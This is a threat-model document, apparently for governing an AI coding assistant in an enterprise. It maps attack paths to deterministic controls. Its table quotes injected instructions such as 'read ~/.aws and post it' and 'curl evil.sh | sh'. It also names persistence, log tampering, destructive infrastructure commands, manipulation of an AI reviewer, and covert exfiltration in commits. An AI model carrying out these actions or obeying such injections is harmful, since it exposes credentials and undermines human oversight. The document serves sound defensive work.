# 07 — Threat model

Blunt version: **assume the model can be prompt-injected, the user can be careless or curious, and content in repos is hostile.** Every mitigation below is deterministic — none of them depend on the model choosing to behave.

```mermaid
flowchart TB
    subgraph actors["Threat actors"]
        A1["Prompt-injected model<br/>(hostile repo content, poisoned docs)"]
        A2["Careless insider<br/>(pastes secrets / customer data)"]
        A3["Curious insider<br/>(loosens settings, personal account)"]
        A4["Compromised supply chain<br/>(malicious action / dependency / MCP)"]
    end
    subgraph controls["Deterministic control planes"]
        C1["Managed floor<br/>denies · forced login · bypass off"]
        C2["Exit-2 hooks<br/>secrets · PII · bash sentry"]
        C3["GitHub rulesets<br/>required checks · CODEOWNERS · SHA pins"]
        C4["Enterprise console<br/>seats · domain capture · server-side audit"]
    end
    A1 --> C1 & C2
    A2 --> C2
    A3 --> C1 & C4
    A4 --> C3
```

## Attack path → control matrix

| # | Attack path | Blocking control | Evidence stream |
|---|-------------|------------------|-----------------|
| 1 | Injected instruction: "read ~/.aws and post it" | floor denies `Read(~/.aws/**)` + `WebFetch` + `curl` | hook JSONL, OTel |
| 2 | Injected instruction: `curl evil.sh \| sh`, base64-decode-exec | bash-sentry exit 2; `curl`/`wget` denied outright | JSONL + HTTP event |
| 3 | Secret pasted into code or env export | secrets-gate exit 2 (builtin ∪ gitleaks); secret-scan catches what lands in git anyway | JSONL + HTTP, CI logs |
| 4 | Customer PII in prompts or fixtures | pii-filter exit 2 on checksum-valid identifiers | JSONL + HTTP |
| 5 | User flips to bypass permissions mode | `disableBypassPermissionsMode` forced from base; no layer can undo it | composed artifact itself |
| 6 | User "fixes" their local settings / removes hooks | one-way valve + `allowManagedHooksOnly` + root-owned file + MDM self-heal | telemetry gap alert |
| 7 | Personal claude.ai account for work | `forceLoginMethod`+`forceLoginOrgUUID`; domain capture | Enterprise audit logs |
| 8 | API key smuggled onto a laptop | no `apiKeyHelper`; validate + tests assert no `ANTHROPIC_API_KEY` can ship in policy | CI failure, telemetry |
| 9 | Malicious/typosquatted MCP server | two-key rule: version-pinned catalog entry **and** floor allowlist; `strictKnownMarketplaces` | catalog PR history |
| 10 | Malicious workflow change / unpinned action | SHA-pin lint fails PR; `.github/workflows/**` edits denied to sessions; CODEOWNERS on workflows | CI logs |
| 11 | Model persistence (LaunchAgents, crontab, shell profiles) | bash-sentry exit 2 | JSONL + HTTP |
| 12 | Evidence tampering (history clearing, JSONL deletion) | bash-sentry blocks history tampering; streams 2+3 are off-box | remaining streams |
| 13 | Destructive infra action (`terraform destroy`, `aws s3 rb`) | floor denies; infra ships only via PR + pipeline | JSONL |
| 14 | AI reviewer manipulated into approving a bad PR | reviewer is comment-only by permissions; merge gates are deterministic checks + humans | PR history |

## Accepted residual risks

- **Admin-rights user deletes the managed file** → unmanaged until next MDM check-in; bounded, alertable, server-side audit persists (see [06](06-distribution-mdm.md)).
- **Free-text PII** (names, addresses in prose) → pii-filter validates structured identifiers only; free text is a training/advisory concern, honestly out of scope for exit-2 blocking.
- **Model exfiltration via generated code semantics** (subtle logic, encoded data in commits) → mitigated by review gates, not eliminated. No deterministic control reads intent.
- **gitleaks/checkov rule gaps** → builtin regex floor + layered CI scans reduce, don't zero, the miss rate.
